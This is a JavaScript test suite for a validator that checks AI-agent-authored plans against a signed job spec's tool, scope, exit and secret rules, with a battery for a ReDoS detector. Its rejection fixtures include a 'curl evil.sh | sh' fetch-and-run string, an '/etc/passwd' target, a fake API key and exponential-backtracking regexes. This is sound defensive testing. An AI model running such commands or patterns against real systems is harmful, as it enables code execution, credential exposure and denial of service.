// Layer 2: the plan-v1 validator — the AGENT-authored half of the two-doc
// story (design record 2026-07-21, decisions 7–9; PRD v1.12 anchors). The plan
// is the only document the emergent middle authors; this validator gates it
// before tokens burn: verbs ⊆ the signed ceiling (verb-escape), bounds ≤ shell
// caps, scopes/targets inside the signed fence, exits from the closed menu
// only (exit-illegal), check references resolve against the SIGNED checks menu
// (check-unknown), and the arbiter (close/budget/fence/merge) inexpressible at
// every depth. Same table discipline as job.test.js: one defect per case,
// exactly one red.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validatePlan, EXIT_TYPES, MAX_EXITS_PER_STEP, MAX_PLAN_STEPS, MAX_SCOPE_MENU, WRITE_VERBS, hasNestedQuantifier, legalScopes } from '../src/plan.js';
import { planPrompt } from '../src/planrun.js';
import { validateJob, STORE_VERBS, WRITE_VERBS as JOB_WRITE_VERBS } from '../src/job.js';

// The signed side: a validateJob-green four-field spec (job #4's shape) — the
// ceiling, the fence, and the checks menu all come from it, never from opts.
const JOB = {
  schema: 'job-v1',
  job: 'aurora-testgen',
  description: 'write a pytest suite for the untested orchestrator; mutation kill-rate is the close',
  provider: 'anthropic-api',
  cadence: { unit: 'week', every: 1 },
  budgetUsd: 1.8,
  writeScope: ['tests/**'],
  goal: 'Write a pytest suite for the orchestrator that kills at least 45% of the frozen mutant set.',
  verdictType: 'green',
  // the staged close (PRD v1.28): the inspection IS the list, and the agent's
  // rulers derive from it — `clean-run` and `form-floor` are stages of the same
  // close whose last stage renders the verdict
  close: [
    { name: 'clean-run', cmd: 'python -m pytest -ra tests/test_orchestrator.py', expect: 0, gapKeep: '^FAILED' },
    { name: 'form-floor', cmd: 'python check_form.py', expect: 0 },
    { name: 'verdict', cmd: 'python grade.py', expect: 0 },
  ],
  tools: ['read', 'grep', 'write', 'edit', 'recall', 'get'],
  escalation: { mode: 'decision-ready' },
};

// The POC's winning shape as a plan: a read-only scout step, then a write step
// whose exit is the F46 composition — tree-changed ∧ check-passes(clean-run).
const PLAN = {
  schema: 'plan-v1',
  steps: [
    {
      id: 'map-functions',
      action: 'Read the orchestrator and write tests/notes.md listing the functions to cover.',
      tools: ['read', 'recall', 'get', 'write'],
      rounds: 6,
      target: 'tests/notes.md',
      exit: [{ type: 'artifact-written', path: 'tests/notes.md', pattern: 'def ' }, { type: 'tree-changed', scope: 'tests/**' }],
    },
    {
      id: 'write-suite',
      action: 'Write the pytest suite for the listed functions; fix failures the clean-run check names.',
      tools: ['get', 'write', 'edit'],
      rounds: 12,
      target: 'tests/test_orchestrator.py',
      exit: [{ type: 'tree-changed', scope: 'tests/**' }, { type: 'check-passes', name: 'clean-run' }],
    },
  ],
};

const clone = (o) => JSON.parse(JSON.stringify(o));
const mut = (fn) => { const p = clone(PLAN); fn(p); return p; };
const OPTS = { job: JOB };

test('the signed side of these tests is itself validateJob-green (anchor, not a fixture authored to pass)', () => {
  const r = validateJob(JOB);
  assert.deepEqual(r.reds, []);
});

test('the POC-shaped plan validates green and returns the plan', () => {
  const r = validatePlan(PLAN, OPTS);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
  assert.deepEqual(r.plan, PLAN);
});

test('string input single-parses; invalid JSON is a parse-error red, plan null', () => {
  const ok = validatePlan(JSON.stringify(PLAN), OPTS);
  assert.equal(ok.ok, true);
  assert.deepEqual(ok.plan, PLAN);
  const bad = validatePlan('{nope', OPTS);
  assert.equal(bad.ok, false);
  assert.equal(bad.reds[0].code, 'parse-error');
  assert.equal(bad.plan, null);
});

test('garbage input types → parse-error red, never a throw', () => {
  for (const garbage of [42, null, true, [], undefined]) {
    const r = validatePlan(garbage, OPTS);
    assert.equal(r.ok, false, `${JSON.stringify(garbage)} must red`);
    assert.equal(r.reds[0].code, 'parse-error');
  }
});

test('a missing or malformed signed job fails CLOSED with its own red — never an open gate', () => {
  for (const job of [undefined, null, 42, 'job', []]) {
    const r = validatePlan(PLAN, { job });
    assert.equal(r.ok, false, `${JSON.stringify(job)} must red`);
    assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'job-invalid:job');
    assert.equal(r.plan, null);
  }
});

test('a writeScope holding a NON-STRING fails closed too — the never-throws contract covers plain data', () => {
  // `Array.isArray(writeScope)` admitted the array and said nothing about its
  // MEMBERS, so the very next line (`writeScope.map(globToPrefix)`) hit
  // `scope.replace is not a function` and validatePlan threw a TypeError on
  // plain parsed data — the one thing its contract says it never does ("Never
  // throws on JSON text or plain parsed data; every failure is a named red").
  // `legalScopes` already filters with the same `isNonEmptyString`; the
  // fail-closed guard just has to ask the same question.
  for (const writeScope of [[123], ['tests/**', null], [''], [{}], [['tests/**']]]) {
    let r;
    assert.doesNotThrow(() => { r = validatePlan({ schema: 'plan-v1', steps: [] }, { job: { goal: 'g', writeScope } }); },
      `writeScope ${JSON.stringify(writeScope)} must red, never throw`);
    assert.equal(r.ok, false);
    assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'job-invalid:job');
    assert.equal(r.plan, null);
  }
});

test('the closed menus ship frozen', () => {
  assert.deepEqual([...EXIT_TYPES], ['artifact-written', 'tree-changed', 'json-valid', 'check-passes']);
  assert.ok(Object.isFrozen(EXIT_TYPES));
  assert.deepEqual([...WRITE_VERBS], ['write', 'edit']);
  assert.ok(Object.isFrozen(WRITE_VERBS));
  assert.equal(MAX_EXITS_PER_STEP, 2);
  assert.equal(MAX_PLAN_STEPS, 8);
});

test('WRITE_VERBS is ONE inventory: plan.js re-exports job.js’s array, same reference', () => {
  // The SECRET_PATTERNS precedent (one inventory, two readers): plan.js held its
  // own frozen copy, so a third write-class verb added to either list would be
  // invisible to the other — the validator would fence a verb the scout filter
  // still handed out (or the reverse). Identity, not deepEqual: two arrays that
  // merely happen to match today are exactly the drift this forbids.
  assert.equal(WRITE_VERBS, JOB_WRITE_VERBS, 'the same frozen array, not a second copy that agrees today');
});

test('verb-escape carries the escaping verb as a STRUCTURED field (the ledger keys on it)', () => {
  // ceiling here is the job's signed tools list; ask for run — never in any ceiling
  const r = validatePlan(mut((p) => { p.steps[0].tools = ['read', 'run']; }), OPTS);
  assert.equal(r.ok, false);
  const red = r.reds.find((x) => x.code === 'verb-escape');
  assert.ok(red, `expected verb-escape, got ${JSON.stringify(r.reds)}`);
  assert.equal(red.path, 'steps.0.tools');
  assert.equal(red.verb, 'run');
});

test('a ceiling NARROWER than the menu binds: a verb in the menu but outside the signed ceiling escapes', () => {
  const narrowJob = clone(JOB);
  narrowJob.tools = ['read', 'grep'];
  const r = validatePlan(mut((p) => {
    p.steps = [{ id: 'read-only', action: 'read the module', tools: ['read', 'write'], rounds: 4, exit: [{ type: 'json-valid', path: 'tests/out.json' }] }];
  }), { job: narrowJob });
  assert.equal(r.ok, false);
  const red = r.reds.find((x) => x.code === 'verb-escape');
  assert.ok(red);
  assert.equal(red.verb, 'write', 'write is in the MENU but outside this spec\'s signed ceiling');
});

test('a job with NO tools field ceilings at the full menu (validateJob permits omission)', () => {
  const noTools = clone(JOB);
  delete noTools.tools;
  const r = validatePlan(PLAN, { job: noTools });
  assert.deepEqual(r.reds, []);
});

test('a close whose only stage is HIDDEN offers no menu at all, so every check-passes is a check-unknown (a partial or empty menu is acceptable, never a failure — PRD v1.28)', () => {
  const noChecks = clone(JOB);
  // one stage, marked as a precondition: it renders the verdict but is not a
  // ruler the agent may borrow mid-build
  noChecks.close = [{ name: 'verdict', cmd: 'python grade.py', expect: 0, offer: false }];
  const r = validatePlan(PLAN, { job: noChecks });
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.code === 'check-unknown' && x.path === 'steps.1.exit.1'),
    `got ${JSON.stringify(r.reds)}`);
});

test('the F17 pairing rule: check-passes on a write-granted step without tree-changed reds exit-illegal', () => {
  // the seed tree is green — a lone check-passes would pass on the untouched
  // repo, minting an unearned step exit (the already-green trap, F17/F46)
  const r = validatePlan(mut((p) => { p.steps[1].exit = [{ type: 'check-passes', name: 'clean-run' }]; }), OPTS);
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'exit-illegal:steps.1.exit');
  assert.match(r.reds[0].detail ?? '', /tree-changed/);
});

test('the mailbox-with-no-hands rule: check-passes on a step with NO write-class tool reds exit-illegal', () => {
  // Measured, not hypothesized (runs ms4l5p6w/ms57zr7c, 4 of 4 drafted plans):
  // a failing check's gap is re-delivered to THIS step's own worker; a read-only
  // "verify" step receives the gap and structurally cannot act, so the loop
  // stalls to cap on a byte-identical gap. The outer close is the run's final
  // verification — a read-only verify step duplicates it with no hands.
  const r = validatePlan(mut((p) => {
    p.steps[1].tools = ['read', 'get'];
    delete p.steps[1].target;
    p.steps[1].exit = [{ type: 'check-passes', name: 'clean-run' }];
  }), OPTS);
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'exit-illegal:steps.1.exit');
  assert.match(r.reds[0].detail ?? '', /write|edit/);
});

test('an UNPARSEABLE tools grant does not derive a mailbox red: one defect, one red', () => {
  // With `tools` missing, `writeStep` cannot be known — firing the mailbox law
  // off its false default would charge the ledger's class table with an
  // exit-shape violation the agent never committed (the defect is the missing
  // grant, already redded as missing-required). One defect, one red.
  const r = validatePlan(mut((p) => {
    delete p.steps[1].tools;
    delete p.steps[1].target;
    p.steps[1].exit = [{ type: 'check-passes', name: 'clean-run' }];
  }), OPTS);
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'missing-required:steps.1.tools');
});

// ─── the two exit laws are COMPLEMENTS: the mailbox rule's edges ───
// Law 1 (F17 pairing): on a WRITE-granted step, check-passes needs the
// tree-changed conjunct. Law 2 (mailbox): on a step with NO write-class tool,
// check-passes is illegal outright. Both key off the SAME `writeStep`
// predicate, so they partition — a step can raise one, never both. These pin
// the predicate's edges (store verbs), the boundary (which red fires where),
// and the rule's REACH, so a later widening cannot quietly overreach onto the
// one composition that has ever greened this job.

test('store-class verbs are not HANDS: a step granting read + stash/remember is still a mailbox with no hands', () => {
  // STORE_VERBS write the `.litectx` store, never the tree (job.js: "NEITHER is
  // read-capable" — and neither is tree-capable either). The gap from a failing
  // check arrives at a worker that cannot change a byte the close will read, so
  // the split the rule reads is WRITE-CLASS, not "writes something somewhere".
  assert.deepEqual(WRITE_VERBS.filter((v) => STORE_VERBS.includes(v)), [], 'the two classes are disjoint by construction');
  const storeJob = clone(JOB);
  storeJob.tools = [...JOB.tools, 'stash', 'remember'];
  assert.deepEqual(validateJob(storeJob).reds, [], 'the widened ceiling is itself signed-green (anchor, not a fixture authored to pass)');
  const r = validatePlan(mut((p) => {
    p.steps[1].tools = ['read', 'stash', 'remember'];
    delete p.steps[1].target;
    p.steps[1].exit = [{ type: 'check-passes', name: 'clean-run' }];
  }), { job: storeJob });
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'exit-illegal:steps.1.exit');
  assert.match(r.reds[0].detail ?? '', /no write-class tool/);
});

test('the rule does not overreach: edit ∧ tree-changed ∧ check-passes with a narrowing per-step scope validates GREEN', () => {
  // `edit` ALONE is write-class (BA-13: judged by the same writeScope fence as
  // write), so this step has hands; the tree-changed conjunct pays law 1; the P
  // `scope` field narrows the fence from the same offered menu. This is the F46
  // winning shape in the widened P vocabulary — the mailbox rule must leave it
  // untouched.
  const r = validatePlan(mut((p) => {
    p.steps[1].tools = ['edit'];
    p.steps[1].scope = 'tests/**';
  }), OPTS);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
});

test('the laws split by CAUSE: a write-granted step missing the conjunct raises the F17 red, never the mailbox one', () => {
  const r = validatePlan(mut((p) => {
    p.steps[1].tools = ['read', 'write', 'edit'];
    p.steps[1].exit = [{ type: 'check-passes', name: 'clean-run' }];
  }), OPTS);
  assert.equal(r.ok, false);
  assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'exit-illegal:steps.1.exit');
  assert.match(r.reds[0].detail ?? '', /requires the tree-changed conjunct/);
  assert.doesNotMatch(r.reds[0].detail ?? '', /no write-class tool/,
    'the step HAS hands — the gap must name the missing conjunct, not a missing grant it already holds');
});

test('the two laws are mutually exclusive by construction — no step can raise both', () => {
  const arms = [
    ['hands, no conjunct', (p) => {
      p.steps[1].tools = ['edit'];
      p.steps[1].exit = [{ type: 'check-passes', name: 'clean-run' }];
    }, /tree-changed conjunct/],
    ['conjunct, no hands', (p) => {
      p.steps[1].tools = ['read'];
      delete p.steps[1].target;
      p.steps[1].exit = [{ type: 'tree-changed', scope: 'tests/**' }, { type: 'check-passes', name: 'clean-run' }];
    }, /no write-class tool/],
  ];
  for (const [name, fn, want] of arms) {
    const r = validatePlan(mut(fn), OPTS);
    const illegal = r.reds.filter((x) => x.code === 'exit-illegal');
    assert.equal(illegal.length, 1, `${name}: exactly one exit-illegal, got ${JSON.stringify(r.reds)}`);
    assert.equal(r.reds.length, 1, `${name}: one defect, one red, got ${JSON.stringify(r.reds)}`);
    assert.equal(illegal[0].path, 'steps.1.exit');
    assert.match(illegal[0].detail ?? '', want);
  }
});

test('the mailbox rule binds check-passes ONLY: json-valid and artifact-written on a read-only step stay legal', () => {
  // Both are FORM checks the shell evaluates against the tree with its own fixed
  // code — neither re-delivers a close stage's gap to this step's worker, so a
  // read-only step holding one is not a mailbox. The law keys on the exit TYPE,
  // never on "the step has an exit".
  for (const exit of [
    [{ type: 'json-valid', path: 'tests/out.json' }],
    [{ type: 'artifact-written', path: 'tests/notes.md', pattern: 'def ' }],
  ]) {
    const r = validatePlan(mut((p) => {
      p.steps[1].tools = ['read', 'get'];
      delete p.steps[1].target;
      p.steps[1].exit = exit;
    }), OPTS);
    assert.deepEqual(r.reds, [], `${exit[0].type} on a read-only step must stay legal`);
  }
});

test('rounds ceiling is an opt the shell sets (12 passes under 40, reds under 8)', () => {
  assert.equal(validatePlan(PLAN, OPTS).ok, true);
  const r = validatePlan(PLAN, { job: JOB, maxStepRounds: 8 });
  assert.equal(r.ok, false);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'bounds:steps.1.rounds');
});

// Single-defect reds: [name, mutator, 'code:path'] — exactly one red each.
const RED_CASES = [
  // -- plan hygiene --
  ['wrong schema tag', (p) => { p.schema = 'v1'; }, 'invalid-value:schema'],
  ['schema missing', (p) => { delete p.schema; }, 'missing-required:schema'],
  ['unknown top-level field', (p) => { p.notes = 'remember to be good'; }, 'unknown-field:notes'],
  ['steps missing', (p) => { delete p.steps; }, 'missing-required:steps'],
  ['steps empty', (p) => { p.steps = []; }, 'missing-required:steps'],
  ['too many steps', (p) => { p.steps = Array.from({ length: 9 }, (_, i) => ({ ...clone(p.steps[0]), id: `s${i}` })); }, 'bounds:steps'],
  ['step not an object', (p) => { p.steps[0] = 'scout'; }, 'invalid-value:steps.0'],
  ['non-slug step id', (p) => { p.steps[0].id = 'Map Functions!'; }, 'invalid-value:steps.0.id'],
  ['duplicate step ids', (p) => { p.steps[1].id = 'map-functions'; }, 'duplicate-id:steps.1.id'],
  ['action missing', (p) => { delete p.steps[0].action; }, 'missing-required:steps.0.action'],
  ['action empty', (p) => { p.steps[0].action = ''; }, 'missing-required:steps.0.action'],

  // -- the arbiter, inexpressible at every depth (decision 9 / F17 depth rule) --
  ['close smuggled into a step', (p) => { p.steps[0].close = { type: 'predicate', cmd: 'true', expect: 0 }; }, 'unknown-field:steps.0.close'],
  ['budget smuggled into a step', (p) => { p.steps[0].budgetUsd = 99; }, 'unknown-field:steps.0.budgetUsd'],
  ['fence smuggled into a step', (p) => { p.steps[0].writeScope = ['src/**']; }, 'unknown-field:steps.0.writeScope'],
  ['close smuggled top-level', (p) => { p.close = { type: 'predicate', cmd: 'true', expect: 0 }; }, 'unknown-field:close'],
  ['checks menu smuggled top-level (the agent never authors a check)', (p) => { p.checks = [{ name: 'my-check', cmd: 'true', expect: 0 }]; }, 'unknown-field:checks'],
  ['dependsOn is dead vocabulary in v1 (decision 7: order IS the order — an inert knob is a fake contrast lever)', (p) => { p.steps[1].dependsOn = ['map-functions']; }, 'unknown-field:steps.1.dependsOn'],

  // -- tools (the ceiling chain) --
  ['tools missing', (p) => { delete p.steps[0].tools; }, 'missing-required:steps.0.tools'],
  ['tools empty', (p) => { p.steps[0].tools = []; }, 'invalid-value:steps.0.tools'],
  ['duplicate tools', (p) => { p.steps[0].tools = ['read', 'read']; }, 'invalid-value:steps.0.tools'],
  ['unknown tool is a typo, never an escape', (p) => { p.steps[0].tools = ['read', 'bash']; }, 'invalid-value:steps.0.tools'],

  // -- rounds (bounds ≤ shell caps) --
  ['rounds missing', (p) => { delete p.steps[0].rounds; }, 'bounds:steps.0.rounds'],
  ['rounds zero', (p) => { p.steps[0].rounds = 0; }, 'bounds:steps.0.rounds'],
  ['rounds non-integer', (p) => { p.steps[0].rounds = 6.5; }, 'bounds:steps.0.rounds'],
  ['rounds above the shell cap', (p) => { p.steps[0].rounds = 41; }, 'bounds:steps.0.rounds'],

  // -- target (v1.18: per-step deliverable, inside the fence) --
  ['target missing on a write-granted step', (p) => { delete p.steps[1].target; }, 'missing-required:steps.1.target'],
  ['target outside the fence', (p) => { p.steps[1].target = 'src/evil.py'; }, 'scope-escape:steps.1.target'],
  ['target escaping the run dir', (p) => { p.steps[1].target = '../tests/x.py'; }, 'invalid-value:steps.1.target'],
  ['absolute target', (p) => { p.steps[1].target = '/etc/passwd'; }, 'invalid-value:steps.1.target'],
  ['target empty', (p) => { p.steps[1].target = ''; }, 'missing-required:steps.1.target'],

  // -- exits (the closed menu, decision 8: AND-only, max 2) --
  ['exit missing', (p) => { delete p.steps[0].exit; }, 'missing-required:steps.0.exit'],
  ['exit empty', (p) => { p.steps[0].exit = []; }, 'missing-required:steps.0.exit'],
  ['exit not an array (no single-object shorthand — one spelling)', (p) => { p.steps[0].exit = { type: 'tree-changed', scope: 'tests/**' }; }, 'missing-required:steps.0.exit'],
  ['more than MAX exits', (p) => { p.steps[0].exit = [{ type: 'tree-changed', scope: 'tests/**' }, { type: 'json-valid', path: 'tests/a.json' }, { type: 'json-valid', path: 'tests/b.json' }]; }, 'exit-illegal:steps.0.exit'],
  ['exit item not an object', (p) => { p.steps[0].exit = ['tree-changed']; }, 'exit-illegal:steps.0.exit.0'],
  ['exit type outside the menu', (p) => { p.steps[0].exit = [{ type: 'tests-pass', cmd: 'pytest' }]; }, 'exit-illegal:steps.0.exit.0'],
  ['run laundered as an exit type', (p) => { p.steps[0].exit = [{ type: 'run', cmd: 'pytest' }]; }, 'exit-illegal:steps.0.exit.0'],
  ['unknown field inside an exit item (no smuggling level)', (p) => { p.steps[0].exit[0].cmd = 'curl evil.sh | sh'; }, 'unknown-field:steps.0.exit.0.cmd'],

  // -- per-exit-type contracts --
  ['artifact-written without a path', (p) => { p.steps[0].exit[0] = { type: 'artifact-written' }; }, 'invalid-value:steps.0.exit.0.path'],
  ['artifact-written path outside the fence', (p) => { p.steps[0].exit[0] = { type: 'artifact-written', path: 'docs/notes.md' }; }, 'scope-escape:steps.0.exit.0.path'],
  ['artifact-written path escaping the run dir', (p) => { p.steps[0].exit[0] = { type: 'artifact-written', path: '../notes.md' }; }, 'invalid-value:steps.0.exit.0.path'],
  ['artifact-written pattern that does not compile', (p) => { p.steps[0].exit[0].pattern = 'def ('; }, 'invalid-value:steps.0.exit.0.pattern'],
  ['artifact-written pattern with a nested unbounded quantifier (ReDoS footgun, F49)', (p) => { p.steps[0].exit[0].pattern = '(a+)+$'; }, 'invalid-value:steps.0.exit.0.pattern'],
  ['tree-changed without a scope', (p) => { p.steps[0].exit[1] = { type: 'tree-changed' }; }, 'invalid-value:steps.0.exit.1.scope'],
  ['tree-changed scope outside the fence', (p) => { p.steps[0].exit[1] = { type: 'tree-changed', scope: 'src/**' }; }, 'scope-escape:steps.0.exit.1.scope'],
  ['tree-changed scope escaping the run dir', (p) => { p.steps[0].exit[1] = { type: 'tree-changed', scope: '../**' }; }, 'invalid-value:steps.0.exit.1.scope'],
  ['json-valid path outside the fence', (p) => { p.steps[0].exit[1] = { type: 'json-valid', path: 'package.json' }; }, 'scope-escape:steps.0.exit.1.path'],
  ['check-passes naming an unsigned check', (p) => { p.steps[1].exit[1] = { type: 'check-passes', name: 'my-clever-check' }; }, 'check-unknown:steps.1.exit.1'],
  ['check-passes without a name', (p) => { p.steps[1].exit[1] = { type: 'check-passes' }; }, 'invalid-value:steps.1.exit.1.name'],

  // -- secrets (the agent-authored doc is the riskier entry point) --
  ['inline key in an action', (p) => { p.steps[0].action = 'auth with sk-ant-api03-abcdefghijklmnop then read'; }, 'secret-literal:steps.0.action'],
];

for (const [name, fn, want] of RED_CASES) {
  test(`red: ${name} → ${want}`, () => {
    const r = validatePlan(mut(fn), OPTS);
    assert.equal(r.ok, false, 'must red');
    assert.equal(r.reds.length, 1, `exactly one red, got: ${JSON.stringify(r.reds)}`);
    assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, want);
    assert.equal(r.plan, null);
  });
}

// F49 — the catastrophic-backtracking detector. A pure-logic algorithm, so a
// direct good/bad battery is the right instrument (Testing Trophy: unit tests
// for algorithms). BAD = an unbounded quantifier applied to a group that
// already repeats unboundedly (the exponential class); GOOD = everything the
// agent legitimately writes, including bounded repetition and escaped/classed
// quantifier chars that must NOT be read as nesting.
const REDOS_BAD = [
  '(a+)+', '(a+)*', '(a*)+', '(a*)*$', '(\\d+)+', '([a-z]+)*', '(\\w+){1,}',
  '((a+)+)', '(a+\\w*)+', '(a+?)+?', '(foo|ba+r)+', '(\\s+)*end',
  // redundant WRAPPING group — the inner repeat is nested one level deeper than
  // the outer quantifier, the same exponential class as (a+)+ (measured: each
  // hangs RegExp.test >10s on ~29 chars). Caught by propagating the inner
  // repeat up through the wrapper; a false-negative here is the dangerous
  // direction (F49, review 2026-07-23).
  '((a+))+', '(?:(a+))+', '((\\d*))*', '(((a+)))+', '((\\w+))*',
  // JS EMPTY character classes — `[]` (matches nothing) and `[^]` (the any-char
  // idiom). The POSIX rule "a leading ] is a literal member" does NOT hold in
  // JS: `[]` closes at the first `]`. Applying it ran the scan past the class's
  // real end and swallowed every later quantifier — a FALSE NEGATIVE, the
  // dangerous direction (measured: `x[^](a+)+$` does not finish RegExp.test in
  // 15s on a 31-char body while the detector passed it, review 2026-07-31).
  'x[^](a+)+$', '(([^]+))+', '(([]a+))+', '[^]x(a+)+',
];
const REDOS_GOOD = [
  'def ', 'a+', '(abc)+', '(a+)', '(a+)?', '(a+){2}', '(a+){1,3}',
  '\\(a+\\)+', '[a+]+', '[+*]{2,}', 'foo|bar', '^\\d{3}-\\d{4}$',
  '(a+)b+', '(a+)(b+)', '(?:abc)+', 'class \\w+\\(', '(a{2,4})+',
];
for (const src of REDOS_BAD) {
  test(`hasNestedQuantifier flags the footgun: ${src}`, () => {
    assert.equal(hasNestedQuantifier(src), true, `${src} should be flagged`);
  });
}
for (const src of REDOS_GOOD) {
  test(`hasNestedQuantifier passes the safe pattern: ${src}`, () => {
    assert.equal(hasNestedQuantifier(src), false, `${src} should NOT be flagged`);
  });
}

// Named, ACCEPTED over-rejection (F49 false-positive class, review 2026-07-23):
// anchor/delimiter-disambiguated repeated-record patterns run LINEARLY in a real
// engine (measured: `(?:^- .+$\n?)+` on 100k reps → 6ms) but the shape-only scan
// flags them. This is the FAIL-SAFE direction — it never admits an exponential
// pattern — and the cost is one mechanical redraft. Locked here so the reject is
// a documented limitation, not a silent surprise: if a future change makes the
// detector "smarter", these must stay SAFE (false-negatives are the dangerous
// direction). The drafter's escape hatch: drop the outer `+` (match one record).
const REDOS_OVERREJECTED = ['(?:^- .+$\\n?)+', '(?:CHANGELOG:.+\\n)+', '(\\d+\\.\\d+)+'];
for (const src of REDOS_OVERREJECTED) {
  test(`hasNestedQuantifier over-rejects (accepted, fail-safe): ${src}`, () => {
    assert.equal(hasNestedQuantifier(src), true, `${src} is flagged by shape — an accepted over-rejection, never a false negative`);
  });
}

// ── the ALTERNATION-OVERLAP class (F49's named false NEGATIVE, closed) ───────
//
// F49 recorded it as a genuine limit of the shape approach: `(a|aa)+` has no inner
// QUANTIFIER to find — the blowup comes from overlapping alternation BRANCHES under
// a repeat — and widening the detector changes which SIGNED specs are admissible, so
// it was parked to the close-authoring rung rather than chased.
//
// MEASURED on this engine before the widening, one fresh process per point (a hot
// RegExp tiers up from the V8 interpreter, and a single-process sweep read 31ch at
// 1340ms and 35ch at 1157ms — backwards for an exponential, and the harness, not the
// regex). `(a|aa)+$` against a run of `a` with one non-matching tail char:
//
//     27ch 218ms · 31ch 1,879ms · 35ch 12,082ms · 39ch 52,563ms · 41ch 189,420ms
//
// ~6.8× per 4 characters — the Fibonacci decomposition count, φ⁴. `(a|a)+$` (equal
// branches, the 2ⁿ case) took 52,256ms on a 27-char body, and `((a|aa))+$` — the
// redundant wrapper the `((a+))+` entry above exists for — took 15,426ms on 35ch.
// Input-bounding is theater here for F49's own reason: tens of characters suffice.
//
// The rule is MONOTONIC: rejections are only ever ADDED. Nothing above is narrowed,
// which is why the whole corpus above this line re-runs unchanged.
const REDOS_BAD_ALT = [
  '(a|aa)+', '(a|aa)*', '(a|aa)+$', '(a|aa){1,}',   // one branch a prefix of the other
  '(a|a)+', '(\\d|\\d\\d)+', '(a|a?)+',              // equal branches, escaped atoms, the optional twin
  '(?:a|aa)+', '(x|xy|xyz)+',                        // non-capturing, and a three-way overlap
  '((a|aa))+', '(?:(a|aa))*',                        // through a redundant wrapper — MEASURED 15.4s at 35ch
  // a nested group BEFORE the alternation: the splitter must come back down to
  // depth 0 or the real `|` is never seen and the hazard reads as safe.
  // MEASURED 15,642ms on a 49-character body ('xa'×24 + '!') — the 2ⁿ case.
  '((?:x)a|(?:x)a)+',
];
for (const src of REDOS_BAD_ALT) {
  test(`hasNestedQuantifier flags the alternation-overlap footgun: ${src}`, () => {
    assert.equal(hasNestedQuantifier(src), true, `${src} should be flagged`);
  });
}

// The floor the widening must not cross: alternations whose branches CANNOT both
// match at one position are the ordinary spelling and stay admissible. `(FAILED|red)`
// is the shape of a pattern live in a signed spec today.
const REDOS_GOOD_ALT = [
  '(a|b)+', '(abc|xyz)+', '(FAILED|red)+', '(cat|dog|bird)*',
  '(a|aa)', '(a|aa)?', '(a|aa){2}', '(a|aa){1,3}',   // no UNBOUNDED repeat — no blowup to drive
  '^(FAILED|red)', 'foo|bar', '(a|b)+(c|d)+',
  // a `|` inside a CHARACTER CLASS is not this group's alternation. Split naively
  // this reads as branches `ab` / `c[a` / `ab]d`, and `ab` is a prefix of `ab]d` —
  // a hazard invented out of punctuation nobody wrote.
  '(ab|c[a|ab]d)+',
  // and a `|` inside a NESTED GROUP is that group's alternation, not this one's.
  // Split depth-blind this reads as `ab` / `c(x` / `ab)d`, and `ab` is a prefix of
  // `ab)d`. The inner `(x|ab)` has no overlap of its own, so nothing legitimately
  // flags here — the reject would be pure punctuation.
  '(ab|c(x|ab)d)+',
];
for (const src of REDOS_GOOD_ALT) {
  test(`hasNestedQuantifier passes the safe alternation: ${src}`, () => {
    assert.equal(hasNestedQuantifier(src), false, `${src} should NOT be flagged`);
  });
}

// NEW named, ACCEPTED over-rejection, the same fail-safe direction as the block
// above. The rule detects the PREFIX relation between branches, which is the
// practical core; whether a prefix overlap can actually be driven exponentially
// depends on what follows the group, and deciding that needs the real engine F49
// declined to take as a dependency. Each of these is flagged and did NOT blow up on
// the body measured (fresh process, same harness as above):
//
//     (ab|abc)+$    'abc'×30 + '!'  (91ch)  → 0.4ms
//     (x|xy|xyz)+$  'xy'×20  + '!'  (41ch)  → 0.3ms
//     (x(a|aa))+$   'xa'×40  + '!'  (81ch)  → 0.4ms
//
// "did not blow up on the body measured" is the honest claim — not "provably
// linear"; no adversarial search was run for a worse input. Rejecting them is the
// direction that never admits an exponential pattern, and the cost is one mechanical
// redraft. NEVER sharpen the detector to admit these (F49's standing rule): a false
// negative is the dangerous direction, and these tests exist so a future "smarter"
// detector fails loudly here instead of quietly opening the class.
const REDOS_OVERREJECTED_ALT = ['(ab|abc)+$', '(x|xy|xyz)+$', '(x(a|aa))+$'];
for (const src of REDOS_OVERREJECTED_ALT) {
  test(`hasNestedQuantifier over-rejects the alternation shape (accepted, fail-safe): ${src}`, () => {
    assert.equal(hasNestedQuantifier(src), true, `${src} is flagged by shape — an accepted over-rejection, never a false negative`);
  });
}

test('the widening is MONOTONIC — every previously-rejected shape is still rejected, and the detector is still ONE function', () => {
  // The rule F49 froze runs both ways and the two halves are not in tension: adding
  // rejections is the allowed direction, removing one is not. This asserts the whole
  // pre-existing BAD corpus in one place, so a widening that traded a catch for a
  // catch reds here even if someone edited the loop above.
  for (const src of [...REDOS_BAD, ...REDOS_OVERREJECTED]) {
    assert.equal(hasNestedQuantifier(src), true, `${src} was rejected before the alternation widening and must still be`);
  }
  for (const src of REDOS_GOOD) {
    assert.equal(hasNestedQuantifier(src), false, `${src} was admissible before the widening and must still be — the widening must not churn a signed spec`);
  }
});

test('the alternation red reaches the REAL gate, on the operator side and the agent side alike', () => {
  const p = validatePlan(mut((x) => { x.steps[0].exit[0].pattern = '(a|aa)+$'; }), OPTS);
  assert.equal(p.ok, false);
  assert.match(p.reds[0].detail ?? '', /F49/);
  assert.equal(p.reds[0].path, 'steps.0.exit.0.pattern');
});

